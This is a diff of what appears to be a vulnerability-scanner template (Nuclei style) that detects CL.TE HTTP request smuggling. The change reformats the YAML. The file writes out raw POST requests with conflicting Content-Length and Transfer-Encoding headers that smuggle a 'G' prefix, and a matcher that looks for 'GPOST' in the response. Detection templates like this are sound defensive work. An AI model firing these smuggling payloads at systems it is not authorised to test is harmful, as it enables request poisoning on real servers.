@@ -1,42 +1,56 @@
 id: cl-te-http-request-smuggling
-
 info:
-  name: CL.TE HTTP request smuggling
   author: pdteam, akincibor
   metadata:
     verified: true
-  severity: low
+  name: CL.TE HTTP request smuggling
   reference:
-    - https://portswigger.net/web-security/request-smuggling
+  - https://portswigger.net/web-security/request-smuggling
+  severity: low
   tags: vuln,vulnerabilities,smuggling
+requests:
+- matchers:
+  - dsl:
+    - contains(body, "Unrecognized method GPOST")
+    type: dsl
+  raw:
+  - 'POST / HTTP/1.1
 
-http:
-  - raw:
-    - |+
-      POST / HTTP/1.1
-      Host: {{Hostname}}
-      Connection: keep-alive
-      Content-Type: application/x-www-form-urlencoded
-      Content-Length: 6
-      Transfer-Encoding: chunked
+    Host: {{Hostname}}
 
-      0
+    Connection: keep-alive
 
-      G
-    - |+
-      POST / HTTP/1.1
-      Host: {{Hostname}}
-      Connection: keep-alive
-      Content-Type: application/x-www-form-urlencoded
-      Content-Length: 6
-      Transfer-Encoding: chunked
+    Content-Type: application/x-www-form-urlencoded
 
-      0
+    Content-Length: 6
 
-      G
+    Transfer-Encoding: chunked
 
-    unsafe: true
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body, "Unrecognized method GPOST")'
+
+    0
+
+
+    G
+
+    '
+  - 'POST / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 6
+
+    Transfer-Encoding: chunked
+
+
+    0
+
+
+    G
+
+
+    '
+  unsafe: true
